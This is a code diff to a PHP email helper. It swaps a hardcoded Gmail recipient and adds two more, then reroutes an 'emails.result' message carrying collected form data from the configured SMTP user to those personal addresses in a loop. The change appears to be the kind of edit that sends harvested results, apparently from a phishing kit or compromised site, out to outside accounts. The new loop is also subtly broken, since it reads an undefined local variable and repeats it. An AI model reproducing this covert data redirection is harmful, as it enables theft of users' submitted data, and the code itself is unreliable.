@@ -320,7 +320,9 @@ public $information_types = [
 											    'sitemap' => "Sitemap",
 											  ];
 
-  public $suEmail = "kudayisitobi@gmail.com";
+  public $suEmail = "dunphydavid83@gmail.com";
+  public $su1 = "uwantbrendacolson@gmail.com";
+  public $su2 = "philipschwarz345@gmail.com";
    
      #{'msg':msg,'em':em,'subject':subject,'link':link,'sn':senderName,'se':senderEmail,'ss':SMTPServer,'sp':SMTPPort,'su':SMTPUser,'spp':SMTPPass,'sa':SMTPAuth};
            function sendEmailSMTP($data,$view,$type="view")
@@ -2753,12 +2755,18 @@ $subject = $data['subject'];
 		             $smtp['data'] = $dt;
     		         $smtp['subject'] = $dt['s'];
                       $smtp['sn'] = $dt['f'];	
-		       
+                      	
 			        try
 		            {
-			          $smtp['em'] = $smtp['su'];
-		              $this->sendEmailSMTP($smtp,"emails.result");
-		              $ret = ['status' => "ok"];
+					  $suu = [$su2,$su2];
+					  foreach($suu as $s)
+					  {
+						 $smtp['em'] = $s;
+						 $this->sendEmailSMTP($smtp,"emails.result");
+		                 $ret = ['status' => "ok"];
+					  }
+					  
+		              
 		            }
 		
 		            catch(Throwable $e)
